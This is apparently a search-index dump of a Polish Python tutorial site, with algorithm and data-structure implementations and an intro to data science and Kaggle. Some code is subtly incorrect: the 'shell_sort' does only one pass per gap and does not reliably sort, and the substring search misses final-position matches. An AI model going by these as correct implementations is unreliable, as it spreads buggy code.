<p>W\u0142a\u015bciwe sortowanie sk\u0142ada si\u0119 z jednej p\u0119tli, w kt\u00f3rej przechodzimy przez kolejne pozycje na sortowanej li\u015bcie (linia 12), znajdujemy indeks elementu najmniejszego, pocz\u0105wszy od bie\u017c\u0105cej pozycji (linia 13), a nast\u0119pnie zamieniamy go miejscami z elementem na bie\u017c\u0105cej pozycji (linia 14).</p>"},{"location":"programming/python/algorithms/sorting/shell-sort/","title":"Sortowanie Shella","text":""},{"location":"programming/python/algorithms/sorting/shell-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/sorting/shell-sort/#implementacja","title":"Implementacja","text":"<pre><code>def shell_sort(array: list):\n    gap = len(array) // 2\n    while gap &gt; 0:\n        for i in range(0, len(array) - gap):\n            if array[i] &gt; array[i + gap]:\n                array[i], array[i + gap] = array[i + gap], array[i]\n\n        gap //= 2\n\narray = [7, 3, 0, 1, 5, 2, 5, 19, 10, 5]\n\nshell_sort(array)\n\nprint(array)\n</code></pre>"},{"location":"programming/python/algorithms/sorting/slow-sort/","title":"Sortowanie wolne","text":""},{"location":"programming/python/algorithms/sorting/slow-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/sorting/slow-sort/#implementacja","title":"Implementacja","text":"<pre><code>def slow_sort(array: list, start_index: int, end_index: int):\n    if start_index &gt;= end_index:\n        return\n\n    middle_index = (start_index + end_index) // 2\n    slow_sort(array, start_index, middle_index)\n    slow_sort(array, middle_index + 1, end_index)\n    if array[end_index] &lt; array[middle_index]:\n        array[middle_index], array[end_index] = array[end_index], array[middle_index]\n\n    slow_sort(array, start_index, end_index - 1)\n\narray = [7, 3, 0, 1, 5, 2, 5, 19, 10, 5]\n\nslow_sort(array, 0, len(array) - 1)\n\nprint(array)\n</code></pre>"},{"location":"programming/python/algorithms/sorting/stooge-sort/","title":"Sortowanie stooge","text":""},{"location":"programming/python/algorithms/sorting/stooge-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/sorting/stooge-sort/#implementacja","title":"Implementacja","text":"<pre><code>def stooge_sort(array: list, i: int, j: int):\n    if array[i] &gt; array[j]:\n        array[i], array[j] = array[j], array[i]\n\n    if j - i &gt; 1:\n        t = (j - i + 1) // 3\n        stooge_sort(array, i, j - t)\n        stooge_sort(array, i + t, j)\n        stooge_sort(array, i, j - t)\n\narray = [7, 3, 0, 1, 5, 2, 5, 19, 10, 5]\n\nstooge_sort(array, 0, len(array) - 1)\n\nprint(array)\n</code></pre>"},{"location":"programming/python/algorithms/structures/bst/","title":"Drzewo przeszukiwa\u0144 binarnych","text":""},{"location":"programming/python/algorithms/structures/bst/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/structures/bst/#implementacja","title":"Implementacja","text":"<pre><code>class BinarySearchTree:\n    def __init__(self):\n        self._value = None\n        self._left = None\n        self._right = None\n\n    def insert(self, value):\n        if self._value is None:\n            self._value = value\n            return\n\n        if value &lt; self._value:\n            if self._left is None:\n                self._left = BinarySearchTree()\n\n            self._left.insert(value)\n        else:\n            if self._right is None:\n                self._right = BinarySearchTree()\n\n            self._right.insert(value)\n\n    def inorder(self):\n        if self._left is not None:\n            self._left.inorder()\n        print(self._value)\n        if self._right is not None:\n            self._right.inorder()\n\n    def preorder(self):\n        print(self._value)\n        if self._left is not None:\n            self._left.preorder()\n        if self._right is not None:\n            self._right.preorder()\n\n    def postorder(self):\n        if self._left is not None:\n            self._left.postorder()\n        if self._right is not None:\n            self._right.postorder()\n        print(self._value)\n\n    def clear(self):\n        self._value = None\n        if self._left is not None:\n            self._left.clear()\n            self._left = None\n        if self._right is not None:\n            self._right.clear()\n            self._right = None\n\nif __name__ == \"__main__\":\n    values = [20, 10, 30, 5, 15, 25, 35]\n    bst = BinarySearchTree()\n\n    for val in values:\n        bst.insert(val)\n\n    print(\"Inorder:\")\n    bst.inorder()\n\n    print(\"Preorder:\")\n    bst.preorder()\n\n    print(\"Postorder:\")\n    bst.postorder()\n\n    bst.clear()\n</code></pre>"},{"location":"programming/python/algorithms/structures/bst/#opis-implementacji","title":"Opis implementacji","text":"<p>http://graphonline.ru/en/?graph=iTYRccYJVswEnVGe</p>"},{"location":"programming/python/algorithms/structures/disjoint-set-union/","title":"Struktura zbior\u00f3w roz\u0142\u0105cznych","text":""},{"location":"programming/python/algorithms/structures/disjoint-set-union/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/structures/disjoint-set-union/#implementacja","title":"Implementacja","text":"<pre><code>class DisjointUnion:\n    \"\"\"\n    Class representing Disjoint-Set-Union structure.\n    :param number_of_nodes: number of elements stored in the structure.\n    :ivar _subsets: information about subsets.\n    \"\"\"\n\n    class Node:\n        def __init__(self, parent: int, rank: int):\n            self.parent = parent\n            self.rank = rank\n\n    def __init__(self, number_of_nodes: int):\n        self._subsets = [self.Node(i, 0) for i in range(number_of_nodes)]\n\n    def union(self, el1: int, el2: int) -&gt; None:\n        \"\"\"\n        Union two elements.\n        :param el1: First element.\n        :param el2: Second element.\n        :return: None\n        \"\"\"\n        x_root = self.find(el1)\n        y_root = self.find(el2)\n\n        if self._subsets[x_root].rank &lt; self._subsets[y_root].rank:\n            self._subsets[x_root].parent = y_root\n        elif self._subsets[x_root].rank &gt; self._subsets[y_root].rank:\n            self._subsets[y_root].parent = x_root\n        else:\n            self._subsets[y_root].parent = x_root\n            self._subsets[x_root].rank += 1\n\n    def is_in_union(self, el1: int, el2: int) -&gt; bool:\n        \"\"\"\n        Checks if two elements are in union i.e. have the same representative.\n        :param el1: First element.\n        :param el2: Second element.\n        :return: True if x and y are in union, False otherwise.\n        \"\"\"\n        return self.find(el1) == self.find(el2)\n\n    def find(self, node_number: int):\n        \"\"\"\n        Find the representative of a given element.\n        :param node_number: element to check\n        :return: Representative of the node_number element in the structure.\n        \"\"\"\n        if self._subsets[node_number].parent != node_number:\n            self._subsets[node_number].parent = self.find(self._subsets[node_number].parent)\n\n        return self._subsets[node_number].parent\n\nif __name__ == \"__main__\":\n    disjoint_union = DisjointUnion(10)\n\n    disjoint_union.union(0, 1)\n\n    print(disjoint_union.is_in_union(0, 1))\n    print(disjoint_union.is_in_union(1, 2))\n</code></pre>"},{"location":"programming/python/algorithms/structures/doubly-linked-list/","title":"Lista dwukierunkowa","text":""},{"location":"programming/python/algorithms/structures/doubly-linked-list/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/structures/doubly-linked-list/#implementacja","title":"Implementacja","text":"<pre><code>class DoublyLinkedList:\n\n  class Element:\n\n    def __init__(self, value):\n      self._value = value\n      self._next = None\n      self._previous = None\n\n    def clear(self):\n      if self._next is not None:\n        self._next.clear()\n        self._next = None\n        self._previous = None\n\n  def __init__(self):\n    self._first = None\n    self._last = None\n    self._count = 0\n\n  def size(self):\n    return self._count\n\n  def push(self, value):\n    if self._first is None:\n      self._first = DoublyLinkedList.Element(value)\n      self._last = self._first\n      self._count += 1\n      return\n\n    if self._first == self._last:\n        self._last = DoublyLinkedList.Element(value)\n        self._first._next = self._last\n        self._last._previous = self._first\n        self._count += 1\n        return\n\n    tmp = self._last\n    self._last = DoublyLinkedList.Element(value)\n    self._last._previous = tmp\n    self._last._previous._next = self._last\n    self._count += 1\n\n  def pop(self):\n    if self._count == 0:\n      return\n\n    if self._count == 1:\n      self._first = None\n      self._last = None\n      self._count = 0\n      return\n\n    self._last = self._last._previous\n    self._last._next = None\n    self._count -= 1\n\n  def __getitem__(self, key):\n    if key &lt; 0 or key &gt;= self._count:\n      return None\n\n    current = self._first\n    current_index = 0\n\n    while current_index &lt; key:\n      current_index += 1\n      current = current._next\n\n    return current._value\n\n  def __setitem__(self, key, value):\n    if key &lt; 0 or key &gt;= self._count:\n      return None\n\n    current = self._first\n    current_index = 0\n\n    while current_index &lt; key:\n      current_index += 1\n      current = current._next\n\n    current._value = value\n\n  def clear(self):\n    self._first.clear()\n    self._first = None\n    self._last = None\n    self._count = 0\n\nif __name__ == \"__main__\":\n  lst = DoublyLinkedList()\n\n  lst.push(1)\n  lst.push(2)\n  lst.push(3)\n\n  lst.pop()\n\n  lst[1] = 10\n\n  lst.push(4)\n\n  for i in range(lst.size()):\n    print(lst[i])\n</code></pre>"},{"location":"programming/python/algorithms/structures/queue/","title":"Kolejka","text":""},{"location":"programming/python/algorithms/structures/queue/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/structures/queue/#implementacja","title":"Implementacja","text":"<pre><code>class Queue:\n  class Element:\n    def __init__(self, value):\n      self._value = value\n      self._next = None\n      self._previous = None\n\n    def clear_forward(self):\n      if self._next is not None:\n        self._next.clear()\n        self._next = None\n        self._previous = None\n\n  def __init__(self):\n    self._first_element = None\n    self._last_element = None\n\n  def push(self, value):\n    new_element = Queue.Element(value)\n\n    if self._first_element is None:\n      self._first_element = new_element\n      self._last_element = new_element\n      return\n\n    new_element._previous = self._last_element\n    self._last_element._next = new_element\n    self._last_element = new_element\n\n  def front(self):\n    return self._first_element._value\n\n  def pop(self):\n    if self._first_element is not None:\n      self._first_element = self._first_element._next\n      if self._first_element is not None:\n        self._first_element._previous = None\n      else:\n        self._last_element = None\n\n  def empty(self) -&gt; bool:\n    return self._first_element is None\n\n  def clear(self):\n    if self._first_element is not None:\n      self._first_element.clear_forward()\n\nif __name__ == \"__main__\":\n  queue = Queue()\n\n  for el in [5, 8, 3, 1, 9]:\n    queue.push(el)\n\n  while not queue.empty():\n    print(queue.front())\n    queue.pop()\n</code></pre>"},{"location":"programming/python/algorithms/structures/segment-trees/","title":"Drzewa przedzia\u0142owe","text":""},{"location":"programming/python/algorithms/structures/segment-trees/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/structures/segment-trees/#implementacja","title":"Implementacja","text":"<pre><code>class SumSegmentTree:\n    class Node:\n        def __init__(self, index_from, index_to):\n            self.index_from = index_from\n            self.index_to = index_to\n            self.value = 0\n            self.lazy = 0\n            self.left = None\n            self.right = None\n\n        def print(self, tabulation=\"\"):\n            print(f\"{tabulation}[{self.index_from}, {self.index_to}]: (val: {self.value}, lazy: {self.lazy})\")\n            if self.index_from != self.index_to:\n                self.left.print(tabulation + \"\\t\")\n                self.right.print(tabulation + \"\\t\")\n\n        def apply_lazy(self):\n            if self.index_from == self.index_to:\n                self.value += self.lazy\n                self.lazy = 0\n                return\n\n            self.value += self.lazy * (self.index_to - self.index_from + 1)\n            self.left.lazy += self.lazy\n            self.right.lazy += self.lazy\n            self.lazy = 0\n\n        def change(self, index_from, index_to, value):\n            if self.index_from == index_from and self.index_to == index_to:\n                self.lazy += value\n                return\n\n            middle = (self.index_from + self.index_to) // 2\n            self.apply_lazy()\n            self.value += value * (index_to - index_from + 1)\n\n            if index_from &lt;= middle:\n                if index_to &lt;= middle:\n                    self.left.change(index_from, index_to, value)\n                else:\n                    self.left.change(index_from, middle, value)\n                    self.right.change(middle + 1, index_to, value)\n            else:\n                self.right.change(index_from, index_to, value)\n\n        def get_value(self, index_from, index_to):\n            if self.index_from == index_from and self.index_to == index_to:\n                return self.value + self.lazy * (self.index_to - self.index_from + 1)\n\n            middle = (self.index_from + self.index_to) // 2\n            self.apply_lazy()\n\n            if index_from &lt;= middle:\n                if index_to &lt;= middle:\n                    return self.left.get_value(index_from, index_to)\n                else:\n                    return self.left.get_value(index_from, middle) + self.right.get_value(middle + 1, index_to)\n            else:\n                return self.right.get_value(index_from, index_to)\n\n    def __init__(self, tab):\n        self.root = self.build(0, len(tab) - 1, tab)\n\n    def build(self, index_from, index_to, tab):\n        current = self.Node(index_from, index_to)\n        if index_from == index_to:\n            current.value = tab[index_from]\n            return current\n\n        middle = (index_from + index_to) // 2\n        current.left = self.build(index_from, middle, tab)\n        current.right = self.build(middle + 1, index_to, tab)\n        current.value = current.left.value + current.right.value\n        return current\n\n    def change(self, index_from, index_to, value):\n        self.root.change(index_from, index_to, value)\n\n    def get_value(self, index_from, index_to):\n        return self.root.get_value(index_from, index_to)\n\n    def print(self):\n        self.root.print()\n\nif __name__ == \"__main__\":\n    tab = [1] * 10\n\n    sum_segment_tree = SumSegmentTree(tab)\n    sum_segment_tree.print()\n\n    print(f\"\\n\\n[3, 5] = {sum_segment_tree.get_value(3, 5)}\")\n\n    sum_segment_tree.change(3, 5, 2)\n\n    print(\"\\n\\n[3, 5] + 2\")\n\n    sum_segment_tree.print()\n\n    print(f\"\\n\\n[3, 5] = {sum_segment_tree.get_value(3, 5)}\")\n</code></pre>"},{"location":"programming/python/algorithms/structures/segment-trees/#opis-implementacji","title":"Opis implementacji","text":"<p>Klasa SumSegmentTree definiuje drzewo przedzia\u0142owe do liczenia sum na przedzia\u0142ach. Klasa Node opisuje struktur\u0119 wewn\u0119trznego w\u0119z\u0142a drzewa segmentowego. W\u0119ze\u0142 przechowuje informacje o warto\u015bci, przedziale, leniwej aktualizacji (lazy update) oraz wska\u017aniki na lewe i prawe poddrzewo. W\u0119ze\u0142 posiada metody do drukowania informacji o sobie, leniwej aktualizacji, zmiany warto\u015bci na danym przedziale oraz pobrania sumy warto\u015bci na danym przedziale.</p> <p>Klasa SumSegmentTree posiada pole root, kt\u00f3re jest korzeniem drzewa segmentowego. Metoda build rekurencyjnie tworzy drzewo segmentowe na podstawie tablicy tab. Konstruktor klasy SumSegmentTree tworzy drzewo segmentowe na podstawie podanej d\u0142ugo\u015bci i tablicy. Metoda print wywo\u0142uje metod\u0119 print na korzeniu drzewa segmentowego, co powoduje wypisanie informacji o strukturze drzewa. Metoda change wykonuje operacj\u0119 zmiany warto\u015bci na danym przedziale, korzystaj\u0105c z leniwych aktualizacji, natomiast metoda get_value zwraca sum\u0119 warto\u015bci na danym przedziale.</p> <p>W cz\u0119\u015bci globalnej tworzona jest instancja klasy SumSegmentTree na podstawie przyk\u0142adowej tablicy. Nast\u0119pnie wywo\u0142ywana jest metoda print dla wy\u015bwietlenia struktury drzewa przed wykonaniem operacji. Wywo\u0142ywana jest operacja get_value na przedziale \\([3, 5]\\) i wynik zostaje wy\u015bwietlony. Nast\u0119pnie wywo\u0142ywana jest operacja change na przedziale \\([3, 5]\\) z warto\u015bci\u0105 \\(2\\) po czym wy\u015bwietlena jest zaktualizowana struktura drzewa. Na ko\u0144cu obliczana jest aktualna suma na przedziale \\([3, 5]\\).</p> <p>Wynik dzia\u0142ania programu:</p> <pre><code>[0, 9]: (val: 10, lazy: 0)\n    [0, 4]: (val: 5, lazy: 0)\n        [0, 2]: (val: 3, lazy: 0)\n            [0, 1]: (val: 2, lazy: 0)\n                [0, 0]: (val: 1, lazy: 0)\n                [1, 1]: (val: 1, lazy: 0)\n            [2, 2]: (val: 1, lazy: 0)\n        [3, 4]: (val: 2, lazy: 0)\n            [3, 3]: (val: 1, lazy: 0)\n            [4, 4]: (val: 1, lazy: 0)\n    [5, 9]: (val: 5, lazy: 0)\n        [5, 7]: (val: 3, lazy: 0)\n            [5, 6]: (val: 2, lazy: 0)\n                [5, 5]: (val: 1, lazy: 0)\n                [6, 6]: (val: 1, lazy: 0)\n            [7, 7]: (val: 1, lazy: 0)\n        [8, 9]: (val: 2, lazy: 0)\n            [8, 8]: (val: 1, lazy: 0)\n            [9, 9]: (val: 1, lazy: 0)\n\n[3, 5] = 3\n\n[3, 5] + 2\n[0, 9]: (val: 16, lazy: 0)\n    [0, 4]: (val: 9, lazy: 0)\n        [0, 2]: (val: 3, lazy: 0)\n            [0, 1]: (val: 2, lazy: 0)\n                [0, 0]: (val: 1, lazy: 0)\n                [1, 1]: (val: 1, lazy: 0)\n            [2, 2]: (val: 1, lazy: 0)\n        [3, 4]: (val: 2, lazy: 2)\n            [3, 3]: (val: 1, lazy: 0)\n            [4, 4]: (val: 1, lazy: 0)\n    [5, 9]: (val: 7, lazy: 0)\n        [5, 7]: (val: 5, lazy: 0)\n            [5, 6]: (val: 4, lazy: 0)\n                [5, 5]: (val: 1, lazy: 2)\n                [6, 6]: (val: 1, lazy: 0)\n            [7, 7]: (val: 1, lazy: 0)\n        [8, 9]: (val: 2, lazy: 0)\n            [8, 8]: (val: 1, lazy: 0)\n            [9, 9]: (val: 1, lazy: 0)\n\n[3, 5] = 9\n</code></pre>"},{"location":"programming/python/algorithms/structures/singly-linked-list/","title":"Lista jednokierunkowa","text":""},{"location":"programming/python/algorithms/structures/singly-linked-list/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/structures/singly-linked-list/#implementacja","title":"Implementacja","text":"<pre><code>class List:\n\n  class Element:\n\n    def __init__(self, value):\n      self._value = value\n      self._next = None\n\n    def clear(self):\n      if self._next is not None:\n        self._next.clear()\n        self._next = None\n\n  def __init__(self):\n    self._first = None\n    self._count = 0\n\n  def size(self):\n    return self._count\n\n  def push(self, value):\n    if self._first is None:\n      self._first = List.Element(value)\n      self._count += 1\n      return\n\n    current = self._first\n    while current._next is not None:\n      current = current._next\n\n    current._next = List.Element(value)\n    self._count += 1\n\n  def pop(self):\n    if self._count == 0:\n      return\n\n    if self._count == 1:\n      self._first = None\n      self._count = 0\n      return\n\n    current = self._first\n\n    while current._next is not None:\n      previous = current\n      current = current._next\n\n    previous.clear()\n    self._count -= 1\n\n  def __getitem__(self, key):\n    if key &lt; 0 or key &gt;= self._count:\n      return None\n\n    current = self._first\n    current_index = 0\n\n    while current_index &lt; key:\n      current_index += 1\n      current = current._next\n\n    return current._value\n\n  def __setitem__(self, key, value):\n    if key &lt; 0 or key &gt;= self._count:\n      return None\n\n    current = self._first\n    current_index = 0\n\n    while current_index &lt; key:\n      current_index += 1\n      current = current._next\n\n    current._value = value\n\n  def clear(self):\n    self._first.clear()\n    self._first = None\n    self._count = 0\n\nif __name__ == \"__main__\":\n  lst = List()\n\n  lst.push(1)\n  lst.push(2)\n  lst.push(3)\n\n  lst.pop()\n\n  lst[1] = 10\n\n  lst.push(4)\n\n  for i in range(lst.size()):\n    print(lst[i])\n</code></pre>"},{"location":"programming/python/algorithms/structures/stack/","title":"Stos","text":""},{"location":"programming/python/algorithms/structures/stack/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/structures/stack/#implementacja","title":"Implementacja","text":"<pre><code>class Stack:\n  class Element:\n    def __init__(self, value):\n      self._value = value\n      self._next = None\n\n    def clear(self):\n      if self._next is not None:\n        self._next.clear()\n        self._next = None\n\n  def __init__(self):\n    self._top_element = None\n\n  def push(self, value):\n    if self._top_element is None:\n      self._top_element = Stack.Element(value)\n      return\n\n    new_element = Stack.Element(value)\n    new_element._next = self._top_element\n    self._top_element = new_element\n\n  def top(self):\n    return self._top_element._value\n\n  def pop(self):\n    if self._top_element is not None:\n      self._top_element = self._top_element._next\n\n  def empty(self) -&gt; bool:\n    return self._top_element is None\n\n  def clear(self):\n    if self._top_element is not None:\n      self._top_element.clear()\n\nif __name__ == \"__main__\":\n  stack = Stack()\n\n  for el in [5, 8, 3, 1, 9]:\n    stack.push(el)\n\n  while not stack.empty():\n    print(stack.top())\n    stack.pop()\n</code></pre>"},{"location":"programming/python/algorithms/text/anagrams/","title":"Anagramy","text":""},{"location":"programming/python/algorithms/text/anagrams/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/text/anagrams/#implementacja","title":"Implementacja","text":"<pre><code>def are_anagrams(a: str, b: str) -&gt; bool:\n    return sorted(a) == sorted(b)\n\na = \"rokowanie\"\nb = \"korowanie\"\n\nif are_anagrams(a, b):\n    print(f\"{a} i {b} s\u0105 anagramami\")\nelse:\n    print(f\"{a} i {b} nie s\u0105 anagramami\")\n</code></pre>"},{"location":"programming/python/algorithms/text/hamming-distance/","title":"Odleg\u0142o\u015b\u0107 Hamminga","text":""},{"location":"programming/python/algorithms/text/hamming-distance/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/text/hamming-distance/#implementacja","title":"Implementacja","text":"<pre><code>def hamming_distance(a: str, b: str) -&gt; int:\n    distance = 0\n\n    for el1, el2 in zip(a, b):\n        if el1 != el2:\n            distance += 1\n\n    return distance\n\na = \"karolin\"\nb = \"kerstin\"\n\ndistance = hamming_distance(a, b)\n\nprint(f\"Odleg\u0142o\u015b\u0107 Hamminga pomi\u0119dzy wyrazami {a} i {b} wynosi {distance}\")\n</code></pre>"},{"location":"programming/python/algorithms/text/levenshtein-distance/","title":"Odleg\u0142o\u015b\u0107 Levenshteina (edycyjna)","text":""},{"location":"programming/python/algorithms/text/levenshtein-distance/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/text/levenshtein-distance/#implementacja","title":"Implementacja","text":"<pre><code>def levenshtein_distance(a: str, b: str) -&gt; int:\n    matrix = [[i + j for j in range(len(b) + 1)] for i in range(len(a) + 1)]\n\n    for i in range(1, len(a) + 1):\n        for j in range(1, len(b) + 1):\n            if a[i - 1] == b[j - 1]:\n                cost = 0\n            else:\n                cost = 1\n\n            matrix[i][j] = min(matrix[i - 1][j - 1] + cost, min(matrix[i - 1][j] + 1, matrix[i][j - 1] + 1))\n\n    return matrix[len(a)][len(b)]\n\na = \"kitten\"\nb = \"sitting\"\n\ndistance = levenshtein_distance(a, b)\n\nprint(f\"Odleg\u0142o\u015b\u0107 Levenshteina pomi\u0119dzy wyrazami {a} i {b} wynosi {distance}\")\n</code></pre>"},{"location":"programming/python/algorithms/text/longest-common-subsequence/","title":"Najd\u0142u\u017cszy wsp\u00f3lny podci\u0105g","text":""},{"location":"programming/python/algorithms/text/longest-common-subsequence/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/text/longest-common-subsequence/#implementacja","title":"Implementacja","text":"<pre><code>def longest_common_subsequence(a: str, b: str) -&gt; str:\n    matrix = [[0] * (len(b) + 1) for _ in range(len(a) + 1)]\n    result = \"\"\n\n    for i in range(1, len(a) + 1):\n        for j in range(1, len(b) + 1):\n            if a[i - 1] == b[j - 1]:\n                matrix[i][j] = matrix[i - 1][j - 1] + 1\n            else:\n                matrix[i][j] = max(matrix[i - 1][j], matrix[i][j - 1])\n\n    value = matrix[len(a)][len(b)]\n    i, j = len(a), len(b)\n\n    while value &gt; 0:\n        if matrix[i - 1][j] == value:\n            i -= 1\n        elif matrix[i][j - 1] == value:\n            j -= 1\n        else:\n            result = a[i - 1] + result\n            i -= 1\n            j -= 1\n            value -= 1\n\n    return result\n\na = \"kitten\"\nb = \"sitting\"\n\nlcs = longest_common_subsequence(a, b)\n\nprint(f\"Longest common subsequence of words {a} and {b} is {lcs}\")\n</code></pre>"},{"location":"programming/python/algorithms/text/naive-substring-search/","title":"Naiwne wyszukiwanie wzorca w tek\u015bcie","text":""},{"location":"programming/python/algorithms/text/naive-substring-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/text/naive-substring-search/#znajdowanie-miejsca-pierwszego-wystapienia-wzorca-w-tekscie","title":"Znajdowanie miejsca pierwszego wyst\u0105pienia wzorca w tek\u015bcie","text":"<pre><code>def substring_pos(a: str, b: str) -&gt; int:\n    for i in range(len(a) - len(b)):\n        j = 0\n        while j &lt; len(b) and b[j] == a[i + j]:\n            j += 1\n\n        if j == len(b):\n            return i\n\n    return -1\n\na = \"alamakota\"\nb = \"kot\"\n\npos = substring_pos(a, b)\nif pos == -1:\n    print(f'{b} is not a substring of {a}')\nelse:\n    print(f'{b} is substring of {a} and starts at position {pos}')\n</code></pre>"},{"location":"programming/python/algorithms/text/palindrome/","title":"Palindrom","text":""},{"location":"programming/python/algorithms/text/palindrome/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/text/palindrome/#implementacja","title":"Implementacja","text":"<pre><code>def is_palindrome(a: str) -&gt; bool:\n    return a == a[::-1]\n\na = \"kajak\"\n\nif is_palindrome(a):\n    print(f'{a} jest palindromem')\nelse:\n    print(f'{a} nie jest palindromem')\n</code></pre>"},{"location":"programming/python/algorithms/text/rpn/","title":"ONP","text":""},{"location":"programming/python/algorithms/text/rpn/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/text/rpn/#implementacja","title":"Implementacja","text":"<pre><code>from queue import LifoQueue\n\ndef calculate_rpn(rpn: str) -&gt; float:\n    rpn_stack = LifoQueue()\n\n    for symbol in rpn:\n        if symbol.isdigit():\n            rpn_stack.put(int(symbol))\n        else:\n            b, a = rpn_stack.get(), rpn_stack.get()\n            result = eval(f\"{a} {symbol} {b}\")\n            rpn_stack.put(result)\n\n    return rpn_stack.get()\n\nrpn = \"27+3/13-4*+2/\"\n\nresult = calculate_rpn(rpn)\n\nprint(result)\n</code></pre>"},{"location":"programming/python/data-science/","title":"Data Science","text":"<p>Data Science, czyli nauka o danych, to interdyscyplinarny obszar, kt\u00f3ry korzysta z metod naukowych, proces\u00f3w i system\u00f3w w celu wydobywania wiedzy i wyci\u0105gania wniosk\u00f3w z danych w r\u00f3\u017cnych formach, zar\u00f3wno strukturalnych, jak i nieustrukturyzowanych.</p> <p>Zadaniem Data Science jest przekszta\u0142canie surowych danych w u\u017cyteczn\u0105 informacj\u0119. Dzia\u0142a na zasadzie gromadzenia, analizy i interpretacji du\u017cych zestaw\u00f3w danych, z wykorzystaniem statystyki, analizy predykcyjnej, uczenia maszynowego, oraz wielu innych technik w celu zrozumienia trend\u00f3w i wzorc\u00f3w.</p>"},{"location":"programming/python/data-science/#python-w-data-science","title":"Python w Data Science","text":"<p>Python zyska\u0142 popularno\u015b\u0107 w \u015bwiecie Data Science nie bez powodu:</p> <ol> <li> <p>Czytelno\u015b\u0107 i \u0142atwo\u015b\u0107 nauki: Python jest j\u0119zykiem o wysokim poziomie abstrakcji, co sprawia, \u017ce jest \u0142atwy do zrozumienia i nauki. Sk\u0142adnia tego j\u0119zyka jest przejrzysta i intuicyjna, co przek\u0142ada si\u0119 na \u0142atwo\u015b\u0107 pisania kodu.</p> </li> <li> <p>Wszechstronno\u015b\u0107: Python jest j\u0119zykiem og\u00f3lnego przeznaczenia. Oznacza to, \u017ce mo\u017cna go u\u017cywa\u0107 do wielu r\u00f3\u017cnych zada\u0144, takich jak analiza danych, uczenie maszynowe, web development i wiele innych.</p> </li> <li> <p>Rozbudowane biblioteki: Python ma wiele pakiet\u00f3w i bibliotek przeznaczonych do pracy z danymi. Niekt\u00f3re z najpopularniejszych to Pandas (do manipulacji danymi), NumPy (do operacji na du\u017cych, wielowymiarowych tablicach i macierzach), Matplotlib (do tworzenia wykres\u00f3w) czy Scikit-learn (do uczenia maszynowego).</p> </li> <li> <p>Wsparcie spo\u0142eczno\u015bci: Python ma aktywn\u0105 spo\u0142eczno\u015b\u0107, kt\u00f3ra tworzy wiele nowych bibliotek, narz\u0119dzi i samouczk\u00f3w. Jest to ogromna zaleta, szczeg\u00f3lnie dla os\u00f3b rozpoczynaj\u0105cych swoj\u0105 przygod\u0119 z Data Science.</p> </li> <li> <p>Integracja z innymi j\u0119zykami: Python mo\u017ce by\u0107 \u0142atwo zintegrowany z innymi j\u0119zykami programowania, takimi jak C/C++ czy Java. To pozwala na tworzenie skomplikowanych system\u00f3w, kt\u00f3re korzystaj\u0105 z zalet r\u00f3\u017cnych j\u0119zyk\u00f3w.</p> </li> </ol> <p>Dlatego Python jest tak cz\u0119sto wykorzystywany w Data Science. Jego prostota i mocne wsparcie dla operacji na danych sprawiaj\u0105, \u017ce jest doskona\u0142ym narz\u0119dziem dla naukowc\u00f3w pracuj\u0105cych z du\u017cymi zbiorami danych.</p>"},{"location":"programming/python/data-science/#kaggle","title":"Kaggle","text":"<p>Kaggle to platforma internetowa nale\u017c\u0105ca do Google, kt\u00f3ra s\u0142u\u017cy jako spo\u0142eczno\u015b\u0107 dla naukowc\u00f3w pracuj\u0105cych z danymi i uczeniem maszynowym. U\u017cytkownicy platformy mog\u0105 znajdowa\u0107 i publikowa\u0107 zestawy danych, eksplorowa\u0107 i tworzy\u0107 modele w interaktywnym \u015brodowisku, a tak\u017ce uczy\u0107 si\u0119 i wsp\u00f3\u0142pracowa\u0107 w konkursach, zadaniach i dyskusjach.</p> <p>Kaggle</p>"},{"location":"programming/python/data-science/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Konkursy: Kaggle jest najbardziej znany z organizowania konkurs\u00f3w uczenia maszynowego, w kt\u00f3rych firmy i instytucje publikuj\u0105 swoje problemy zwi\u0105zane z danymi, a spo\u0142eczno\u015b\u0107 Kaggle konkuruje w celu stworzenia najlepszego modelu.</p> </li> <li> <p>Zbiory danych: u\u017cytkownicy mog\u0105 przeszukiwa\u0107, pobiera\u0107 i publikowa\u0107 zbiory danych na platformie. Dost\u0119pne s\u0105 setki tysi\u0119cy otwartych zestaw\u00f3w danych na r\u00f3\u017cne tematy.</p> </li> <li> <p>Notebooki: Kaggle oferuje interaktywne \u015brodowisko do kodowania (Notebooki), kt\u00f3re pozwala u\u017cytkownikom tworzy\u0107, udost\u0119pnia\u0107 i komentowa\u0107 skrypty w Pythonie i R.</p> </li> <li> <p>Nauka: Kaggle oferuje wiele kurs\u00f3w na r\u00f3\u017cne tematy zwi\u0105zane z nauk\u0105 o danych i uczeniem maszynowym.</p> </li> <li> <p>Dyskusje: Kaggle ma aktywne forum dyskusyjne, na kt\u00f3rym naukowcy pracuj\u0105cy z danymi, in\u017cynierowie uczenia maszynowego i entuzja\u015bci mog\u0105 zadawa\u0107 pytania, dzieli\u0107 si\u0119 pomys\u0142ami i uczestniczy\u0107 w interesuj\u0105cych dyskusjach na r\u00f3\u017cne tematy.</p> </li> </ol> <p>Kaggle jest niezwykle u\u017cyteczny dla os\u00f3b ucz\u0105cych si\u0119 lub pracuj\u0105cych w dziedzinie nauki o danych i uczenia maszynowego, umo\u017cliwiaj\u0105c im dost\u0119p do ogromnej ilo\u015bci danych, narz\u0119dzi analizy, a tak\u017ce do 